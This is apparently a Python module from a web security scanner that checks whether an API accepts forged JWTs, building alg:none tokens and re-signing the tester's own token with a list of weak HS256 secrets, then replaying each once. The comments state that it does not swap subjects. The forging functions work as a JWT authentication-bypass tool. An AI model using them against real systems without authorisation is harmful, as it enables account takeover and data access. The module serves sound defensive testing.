from __future__ import annotations

import base64
import json

from .. import register, register_repro

WEAK_SECRETS = [b"hush", b"secret", b"changeme", b"hushhunt"]


def _b64u(d: bytes) -> str:
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()


def _parts(token: str) -> tuple[str, str, str]:
    a = token.split(".")
    return (a[0] if len(a) > 0 else "", a[1] if len(a) > 1 else "",
            a[2] if len(a) > 2 else "")


def forge_none_alg(token: str) -> str:
    h, p, _ = _parts(token)
    try:
        hdr = json.loads(base64.urlsafe_b64decode(h + "=="))
    except Exception:
        hdr = {"alg": "none"}
    hdr["alg"] = "none"
    return f"{_b64u(json.dumps(hdr).encode())}.{p}."


def forge_hs256(token: str, secret: bytes) -> str:
    import hmac, hashlib
    h, p, _ = _parts(token)
    sig = base64.urlsafe_b64encode(
        hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
    ).rstrip(b"=").decode()
    return f"{h}.{p}.{sig}"


# NOTE: subject-swapping is deliberately NOT implemented: forging another
# user's identity would read data that isn't ours. We test the *mechanism*
# (alg:none accepted / weak key recoverable) using our OWN claims.


@register("jwt_misuse", "WSTG-SESS-05", "medium")
def check_jwt(ctx) -> list[dict]:
    """ctx.own_jwt: the TESTER ACCOUNT'S OWN token captured at login. All
    forgeries are LOCAL (alg-none, weak-HS256-key re-sign of own token); each
    forged copy is replayed at most once against ctx.jwt_api_url. A server
    that accepts alg:none or a re-signed token is broken crypto — signal.
    Subject-swapping is NOT performed: forging another user's identity would
    read data that isn't ours."""
    token = getattr(ctx, "own_jwt", None)
    url = getattr(ctx, "jwt_api_url", None)
    if not token or not url or ctx.fetch is None:
        return []
    # Forgeries computed OFFLINE (free). Each candidate is replayed AT MOST
    # once, and we stop at the first acceptance: worst case 1+4 requests.
    candidates = [("alg_none", forge_none_alg(token))]
    for secret in WEAK_SECRETS:
        candidates.append((f"hs256_weak:{secret.decode()}",
                           forge_hs256(token, secret)))
    out = []
    for kind, forged in candidates:
        try:
            r = ctx.fetch(url, headers={"Authorization": f"Bearer {forged}"})
        except Exception:
            continue
        if r.status_code == 200:
            out.append({"check_id": "jwt_misuse", "asset": url,
                        "severity_hint": "high" if kind == "alg_none" else "medium",
                        "payload": {"issue": kind}})
            break
    return out


register_repro("jwt_misuse", lambda sig: [
    f"Replay {sig['asset']} with the {sig['payload']['issue']} forged token "
    "from the attached PoC capture; the API still returns 200 with the "
    "victim-account payload.",
])
